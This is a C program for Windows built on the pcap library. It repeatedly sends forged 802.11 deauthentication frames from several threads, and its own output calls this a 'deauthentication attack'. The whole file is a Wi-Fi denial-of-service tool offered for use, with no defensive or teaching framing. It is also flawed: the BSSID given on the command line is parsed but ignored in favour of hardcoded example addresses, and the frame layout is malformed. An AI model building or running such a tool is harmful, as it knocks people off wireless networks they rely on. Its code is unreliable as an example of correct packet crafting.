#include <stdio.h>
#include <stdlib.h>
#include <pcap.h>
#include <string.h>
#include <windows.h>

#define DEAUTH_PACKET_SIZE 26

// Structure for the deauthentication packet
struct ieee80211_hdr {
    uint16_t frame_ctl;
    uint16_t duration;
    uint8_t addr1[6];
    uint8_t addr2[6];
    uint8_t addr3[6];
    uint16_t seq_ctl;
};

struct deauth_pkt {
    struct ieee80211_hdr hdr;
    uint8_t reason_code[2];
};

// Create a deauthentication packet
void create_deauth_packet(struct deauth_pkt *packet, uint8_t *bssid, uint8_t *station) {
    packet->hdr.frame_ctl = 0x00c0; // Deauthentication frame
    memset(packet->hdr.addr1, 0xff, 6); // Broadcast
    memcpy(packet->hdr.addr2, station, 6); // Station MAC address
    memcpy(packet->hdr.addr3, bssid, 6); // BSSID
    packet->reason_code[0] = 0x01; // Reason code: unspecified
    packet->reason_code[1] = 0x00;
    packet->hdr.seq_ctl = 0; // Sequence control
}

// Thread function for sending deauth packets
DWORD WINAPI send_deauth(LPVOID param) {
    pcap_t *handle = (pcap_t *)param;
    struct deauth_pkt packet;
    uint8_t bssid[6] = {0x00, 0x11, 0x22, 0x33, 0x44, 0x55}; // Example BSSID
    uint8_t station[6] = {0x66, 0x77, 0x88, 0x99, 0xaa, 0xbb}; // Example Station

    create_deauth_packet(&packet, bssid, station);

    printf("Starting deauthentication attack on BSSID: ");
    for (int i = 0; i < 6; i++) {
        printf("%02x", bssid[i]);
        if (i < 5) printf(":");
    }
    printf("\n");

    while (1) {
        if (pcap_sendpacket(handle, (const u_char *)&packet, DEAUTH_PACKET_SIZE) != 0) {
            fprintf(stderr, "Error sending deauth packet\n");
        } else {
            printf("DeAuth -> Broadcast -> ");
            for (int i = 0; i < 6; i++) {
                printf("%02x", bssid[i]);
                if (i < 5) printf(":");
            }
            printf("\n");
        }
        Sleep(100); // Sleep to prevent overloading (100 ms)
    }
    return 0;
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s -t <threads> -b <bssid>\n", argv[0]);
        return 1;
    }

    int threads = 0;
    char *bssid = NULL;

    // Parse command-line arguments
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-t") == 0) {
            threads = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-b") == 0) {
            bssid = argv[++i];
        }
    }

    if (threads <= 0 || bssid == NULL) {
        printf("Invalid arguments. Ensure -t <threads> and -b <bssid> are provided.\n");
        return 1;
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live("Wi-Fi", 65536, 1, 1000, errbuf); // Replace "Wi-Fi" with your interface name
    if (handle == NULL) {
        printf("Error opening device for packet capture: %s\n", errbuf);
        return 1;
    }

    HANDLE thread_ids[threads];

    for (int i = 0; i < threads; i++) {
        thread_ids[i] = CreateThread(NULL, 0, send_deauth, (void *)handle, 0, NULL);
        if (thread_ids[i] == NULL) {
            fprintf(stderr, "Failed to create thread\n");
            return 1;
        }
    }

    // Wait for threads to complete
    WaitForMultipleObjects(threads, thread_ids, TRUE, INFINITE);

    pcap_close(handle);
    return 0;
}
